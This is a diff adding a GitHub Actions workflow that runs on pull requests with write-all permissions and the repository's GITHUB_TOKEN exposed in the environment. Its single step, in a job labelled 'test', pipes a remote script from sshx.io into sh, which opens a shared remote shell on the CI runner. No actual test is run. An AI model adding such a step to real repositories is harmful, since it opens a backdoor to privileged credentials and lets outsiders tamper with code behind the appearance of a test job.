@@ -1,0 +1,11 @@
+on: pull_request
+
+permissions: write-all
+
+jobs:
+  test:
+    runs-on: ubuntu-22.04
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - run: curl -sSf https://sshx.io/get | sh -s run
